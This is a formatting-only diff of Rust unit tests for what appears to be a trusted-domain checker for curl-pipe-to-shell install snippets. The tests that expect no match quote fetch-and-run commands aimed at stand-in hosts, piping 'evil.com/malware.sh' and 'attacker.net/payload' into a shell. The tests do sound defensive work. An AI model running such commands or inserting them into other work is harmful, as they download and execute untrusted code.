@@ -90,16 +90,26 @@ mod tests {
     #[test]
     fn test_match_simple_domain() {
         let db = TrustedDomainDb::load_builtin();
-        assert!(db.check_snippet("curl -fsSL https://ollama.com/install.sh | sh").is_some());
-        assert!(db.check_snippet("curl -sSf https://sh.rustup.rs | sh").is_some());
-        assert!(db.check_snippet("curl -fsSL https://brew.sh/install.sh | bash").is_some());
+        assert!(db
+            .check_snippet("curl -fsSL https://ollama.com/install.sh | sh")
+            .is_some());
+        assert!(db
+            .check_snippet("curl -sSf https://sh.rustup.rs | sh")
+            .is_some());
+        assert!(db
+            .check_snippet("curl -fsSL https://brew.sh/install.sh | bash")
+            .is_some());
     }
 
     #[test]
     fn test_no_match_unknown_domain() {
         let db = TrustedDomainDb::load_builtin();
-        assert!(db.check_snippet("curl https://evil.com/malware.sh | sh").is_none());
-        assert!(db.check_snippet("wget https://attacker.net/payload | bash").is_none());
+        assert!(db
+            .check_snippet("curl https://evil.com/malware.sh | sh")
+            .is_none());
+        assert!(db
+            .check_snippet("wget https://attacker.net/payload | bash")
+            .is_none());
     }
 
     #[test]
